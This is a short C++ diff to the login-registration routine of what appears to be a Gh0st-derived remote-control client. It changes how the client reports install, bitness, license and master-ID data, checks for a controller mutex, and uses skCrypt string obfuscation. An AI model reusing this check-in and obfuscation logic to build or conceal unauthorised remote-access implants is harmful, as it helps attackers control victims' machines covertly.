@@ -263,15 +263,14 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 	LoginInfor.AddReserved("?");						// 安装信息
 	LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
 	std::string str;
-#ifndef _DEBUG
-	HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
+	std::string masterHash(skCrypt(MASTER_HASH));
+	HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
+	hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
 	if (hMutex != NULL) {
 		CloseHandle(hMutex);
-#else
-		{
-#endif
-		iniFile cfg;
-		str = cfg.GetStr("settings", "Password", "");
+		config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
+		str = cfg->GetStr("settings", "Password", "");
+		delete cfg;
 		str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
 		auto list = StringToVector(str, '-', 3);
 		str = list[1].empty() ? "Unknown" : list[1];
@@ -279,7 +278,6 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 	LoginInfor.AddReserved(str.c_str());			   // 授权信息
 	bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
 		strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
-	std::string masterHash(skCrypt(MASTER_HASH));
 	const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
 	memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
 	return LoginInfor;
